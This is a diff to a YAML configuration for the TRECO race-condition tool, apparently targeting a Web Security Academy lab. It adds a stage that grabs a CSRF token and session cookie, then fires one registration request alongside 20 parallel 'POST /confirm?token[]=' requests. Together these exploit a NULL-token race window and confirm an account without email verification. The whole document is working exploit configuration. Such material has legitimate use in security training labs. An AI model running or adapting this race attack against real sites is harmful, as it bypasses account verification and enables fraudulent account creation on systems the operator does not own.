@@ -27,26 +27,64 @@ metadata:
     and 50 threads simultaneously attempt to confirm without a token.
 
 target:
-  host: "{{ argv('target', '0a0a00b3033f0cb580c0a7b200c70024.web-security-academy.net') }}"
+  host: "{{ env('LAB_HOST') }}"
   port: 443
   threads: 20
   reuse_connection: false
   tls:
     enabled: true
     verify_cert: false
+  # proxy:
+  #   type: http
+  #   host: 127.0.0.1
+  #   port: 8080
 
 entrypoint:
-  state: race_attack
+  state: get_register_page
   input:
     # Generate unique username for this attack
-    username: "attacker{{ range(1000, 9999) | random }}"
-    email: "test@exploit-{{ range(100000, 999999) | random }}.exploit-server.net"
+    username: "attacker-{{ '%08x' | format(range(0, 16777215) | random) }}"
+    email: "attacker@ginandjuice.shop"
+    password: "hacked123"
 
 # ============================================================================
 # STATES
 # ============================================================================
 
 states:
+
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  # Stage 1: Get Registration Page
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  get_register_page:
+    description: "Get CSRF token for registration"
+    
+    request: |
+      GET /register HTTP/1.1
+      Host: {{ target.host }}
+      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+      Connection: close
+
+    
+    extract:
+      csrf_token:
+        type: xpath
+        pattern: '//input[@name="csrf"]/@value'
+      
+      session:
+        type: cookie
+        pattern: phpsessionid
+    
+    logger:
+      on_state_leave: |
+        🔐 Session: {{ get_register_page.session[:16] }}...
+        🎫 CSRF: {{ get_register_page.csrf_token[:16] }}...
+        👤 Attempting to register: {{ username }} ({{ email }})
+    
+    next:
+      - on_status: 200
+        goto: race_attack
 
   # --------------------------------------------------------------------------
   # Race Attack with Thread Groups
@@ -63,28 +101,25 @@ states:
       connection_strategy: multiplexed
       thread_propagation: single
       
-      # NEW: Thread Groups Configuration
       thread_groups:
-        # Group 1: Registration request (creates user with token=NULL)
         - name: registration
           threads: 1
-          delay_ms: 0
-          
+        
           request: |
             POST /register HTTP/1.1
             Host: {{ target.host }}
             Content-Type: application/x-www-form-urlencoded
-            Content-Length: {{ (("csrf=" + csrf + "&username=" + username + "&email=" + email) | length) }}
+            Cookie: phpsessionid={{ get_register_page.session }}
             
-            csrf={{ csrf }}&username={{ username }}&email={{ email }}
+            csrf={{ get_register_page.csrf_token }}&username={{ username }}&email={{ email }}&password={{ password }}
           
           variables:
             description: "Create user account"
         
         # Group 2: Confirmation requests (exploit the NULL token race window)
         - name: confirmations
-          threads: 50
-          delay_ms: 10
+          threads: 20
+          delay_ms: 50
           
           request: |
             POST /confirm?token[]= HTTP/1.1
@@ -95,21 +130,39 @@ states:
             description: "Confirm without token"
     
     logger:
+
+      on_thread_leave: |
+        {% if response.status_code == 200 %}
+        {% if input.name == "confirmations" %}
+        🎉 {{ input.variables.description }}: CONFIRMED! Account created without email verification!
+          👤 Username: {{ username }}
+          📧 Email: {{ email }}
+          🔑 Password: {{ password }}
+        {% else %}
+        ✅ {{ input.variables.description }}: Success (HTTP {{ response.status_code }}) - {{ "%.04f" | format(timing_ms) }} ms
+        {% endif %}
+        {% else %}
+        ❌ {{ input.variables.description }} failed (HTTP {{ response.status_code }}) - {{ "%.04f" | format(timing_ms) }} ms
+        {% endif %}
+
       on_state_enter: |
         
-        ╔═════════════════════════════════════════════════════════════════════╗
-        ║  🦎 TRECO - Partial Construction Race Attack                        ║
-        ╠═════════════════════════════════════════════════════════════════════╣
-        ║  🎯 Target:   {{ "%-53s" | format(target.host)                   }} ║
-        ║  👤 Username: {{ "%-53s" | format(username)                      }} ║
-        ║  📧 Email:    {{ "%-53s" | format(email)                         }} ║
-        ╚═════════════════════════════════════════════════════════════════════╝
-        
-        🔧 Thread Groups Configuration:
-           Group 1: registration   (1 thread,  0ms delay)
-           Group 2: confirmations (50 threads, 10ms delay)
+        ╔══════════════════════════════════════════════════════════════════════════════╗
+        ║  🦎 TRECO - Partial Construction Race Attack                                 ║
+        ╠══════════════════════════════════════════════════════════════════════════════╣
+        ║  🎯 Target:   {{ "%-62s" | format(target.host)                            }} ║
+        ║  👤 Username: {{ "%-62s" | format(username)                               }} ║
+        ║  📧 Email:    {{ "%-62s" | format(email)                                  }} ║
+        ╚══════════════════════════════════════════════════════════════════════════════╝
+
+        {% set registration = race.thread_groups | selectattr("name", "equalto", "registration") | first %}
+        {% set confirmations = race.thread_groups | selectattr("name", "equalto", "confirmations") | first %}
+           Group 1: registration   ({{ registration.threads }} thread,  {{ registration.delay_ms }}ms delay)
+           Group 2: confirmations ({{ confirmations.threads }} threads, {{ confirmations.delay_ms }}ms delay)
         
         ⏳ Starting race attack...
+
+        
       
       on_state_leave: |
         
@@ -131,7 +184,8 @@ states:
         {% endif %}
     
     next:
-      - goto: end
+      - on_status: [200, 302]
+        goto: end
 
   # --------------------------------------------------------------------------
   # Terminal States
